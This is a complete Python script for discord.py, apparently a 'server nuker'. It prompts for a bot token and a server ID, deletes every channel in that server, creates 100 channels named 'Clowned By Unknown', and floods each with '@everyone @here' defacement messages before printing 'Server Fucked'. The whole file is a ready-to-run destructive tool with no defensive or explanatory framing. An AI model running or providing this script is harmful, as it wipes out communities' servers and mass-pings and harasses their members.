import discord
from discord.ext import commands
import asyncio
import os

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

clear_screen()  

RED, YELLOW, GREEN, BLUE, RESET, BOLD = (
    "\033[91m", "\033[93m", "\033[92m", "\033[94m", "\033[0m", "\033[1m"
)


def prompt_token():  return input(f"{RED}Enter your Discord bot token: {RESET}")

clear_screen

def prompt_server_id():
    while True:
        try: return int(input(f"{YELLOW}Enter the Discord server (guild) ID: {RESET}"))
        except ValueError: print(f"{RED}Invalid ID – numeric value required.{RESET}")

BOT_TOKEN       = prompt_token()
TARGET_SERVER_ID = prompt_server_id()

intents = discord.Intents.default()
intents.message_content, intents.guilds, intents.messages = True, True, True
bot = commands.Bot(command_prefix="!", intents=intents)

async def log(msg): print(f"{BLUE}{msg}{RESET}")

@bot.event
async def on_ready():
    clear_screen()
    guild = bot.get_guild(TARGET_SERVER_ID)
    if not guild:
        print(f"{RED}Server with ID {TARGET_SERVER_ID} not found.{RESET}")
        await bot.close()
        return
    await run_task(guild)

CHANNEL_NAME      = "Clowned By Unknown"
MESSAGE_CONTENT   = "h2cked By Unknown @everyone @here"
NUMBER_OF_CHANNELS = 100

async def run_task(guild):
    async def delete_and_log(ch):
        try:
            await ch.delete()
            await log(f"Deleted channel: {ch.name}")
        except Exception as e:
            await log(f"Error deleting {ch.name}: {e}")

    delete_tasks = [asyncio.create_task(delete_and_log(ch)) for ch in guild.channels]
    await asyncio.gather(*delete_tasks)

    async def create_and_log(name):
        try:
            ch = await guild.create_text_channel(name)
            await log(f"Created channel: {ch.name}")
            return ch
        except Exception as e:
            await log(f"Error creating channel {name}: {e}")
            return None

    create_tasks = [asyncio.create_task(create_and_log(CHANNEL_NAME)) for _ in range(NUMBER_OF_CHANNELS)]
    created_channels = [ch for ch in await asyncio.gather(*create_tasks) if ch]

    async def send_and_log(ch):
        try:
            await ch.send(MESSAGE_CONTENT)
            await log(f"Message sent to: {ch.name}")
        except Exception as e:
            await log(f"Error sending to {ch.name}: {e}")

    send_tasks = [asyncio.create_task(send_and_log(ch)) for ch in created_channels]
    await asyncio.gather(*send_tasks)

    print(f"\n{BOLD}{RED}Server Fucked - Exit now !!{RESET}")
    await bot.close()

bot.run(BOT_TOKEN)